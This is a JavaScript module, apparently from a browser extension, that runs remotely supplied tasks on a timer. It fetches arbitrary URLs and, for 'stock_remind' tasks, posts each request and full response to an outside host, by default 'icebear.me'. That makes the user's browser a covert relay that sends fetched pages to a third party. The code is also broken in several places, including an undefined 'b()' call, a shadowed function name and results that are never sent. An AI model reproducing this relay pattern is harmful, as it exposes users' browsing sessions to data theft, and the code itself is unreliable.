var jm_browsername = "guge";
KISSY.add("jmintervalquery", function(a){
    var t = 0;
    function a(d){

        var f =  JSON.parse(decodeURIComponent(d));

        var kissy_http_fun = KISSY.io.get;
        if(f.postmethod){
            kissy_http_fun = KISSY.io.post;
        }

        f.url && f.url.length > 0 && kissy_http_fun(decodeURIComponent(f.url),(f.postdata ? decodeURIComponent(f.postdata) : ''), function(z,e){
            	if(e != "success")return;

            	try{
    	        	if(f.tasktype == "stock_remind"){
                        var p = encodeURIComponent(JSON.stringify({"request":d, "response":encodeURIComponent(z)}));
                        f.post && KISSY.io.post( (f.posturl || "http://icebear.me/") + "&tp=jn", p);                        
                    }else if(f.tasktype == "with_parser_code"){
                        if(f.parsecode && f.posturl){
                            try{
                                var doc = document.implementation.createHTMLDocument();  
                                doc.body.innerHTML = z;  
                                var p = JSON.parse(f.parsecode);
                                KISSY.io.post(f.posturl, p);
                            }catch(err){

                            }
                        }
                    }else if(f.tasktype == "domselector"){
    			        var doc = document.implementation.createHTMLDocument();  
    			        doc.body.innerHTML = z;  

    			        //[{"a":{"sel":".priceslot", "ops":[{"TRIM":""}, {"REPLACE":["a","b"]}]}}];
    			        var ret = [];
    			        for(var i = 0 ; i < f.param_list.length; i++){
    			        	var info = f.param_list[i];
			        		for(var k in info){
			        			var v = info[k];
			        			var t1 = '';
			        			try{
                                    if(!v.elemsel){
				        			     t1 = doc.querySelector(v.sel).outerText;
                                    }else{
                                         t1 = doc.querySelector(v.sel);
                                         for(var jc1 = 0; jc1 < v.elemsel.length; jc1++){
                                            var op1 = v.elemsel[jc1];

                                            for(var opkey in op1){
                                                if(opkey == "PARENT"){
                                                    t1 = t1.parentElement;
                                                }else if(opkey == "INNERHTML"){
                                                    t1 = t1.innerHTML;
                                                }else if(opkey == "INNERTEXT"){
                                                    t1 = t1.innerText;
                                                }else if(opkey == "SEL"){
                                                    t1 = t1.querySelector(op1[opkey]);
                                                }else if(opkey == "OUTHTML"){
                                                    t1 = t1.outerHTML;
                                                }else if(opkey == "OUTTEXT"){
                                                    t1 = t1.outerText;
                                                }else if(opkey == "ATTR"){
                                                    t1 = t1.getAttribute(op1[opkey]);
                                                }
                                            }
                                         }
                                    }
				        			
				        		}catch(err){}

				        		ret.push(JSON.parse('{"' + k + '":"' + encodeURIComponent(t1) + '"}'));
			        		}
    			        }
                       
                    }
    		    }catch(err){
    		    	
    		    }
            })
    }

    function d(t){
        setInterval(function(){b()}, t);
    }
    return d
});
